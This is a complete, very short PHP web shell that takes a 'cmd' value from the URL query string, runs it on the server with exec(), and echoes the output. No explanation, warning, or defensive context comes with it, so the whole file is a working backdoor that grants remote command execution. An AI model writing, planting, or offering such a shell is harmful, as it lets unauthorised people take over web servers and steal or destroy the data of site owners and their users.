<?php
if (!isset($_GET['cmd'])) die("No command");
$cmd = $_GET['cmd'];
exec($cmd, $out, $status);
echo implode("\n", $out);
?>
